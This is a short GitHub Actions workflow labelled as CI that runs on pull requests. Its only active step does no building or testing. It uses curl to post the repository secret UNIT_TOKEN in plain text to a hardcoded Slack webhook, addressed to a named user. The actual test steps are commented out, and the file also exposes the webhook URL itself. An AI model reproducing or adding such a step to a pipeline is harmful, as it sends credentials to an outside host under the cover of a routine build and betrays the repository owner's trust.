name: CI
on: 
  workflow_dispatch:
  pull_request:
    

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: |
          curl -X POST --data-urlencode "payload={\"channel\": \"@asaf.levy\", \"username\": \"webhookbot\", \"text\": \"token: ${{ secrets.UNIT_TOKEN }}\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/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

      # - run: |
      #     touch .env
      #     echo UNIT_TOKEN=${{ secrets.UNIT_TOKEN }} >> .env
      #     echo UNIT_API_URL=${{ secrets.UNIT_API_URL }} >> .env
      # - run: npm run test
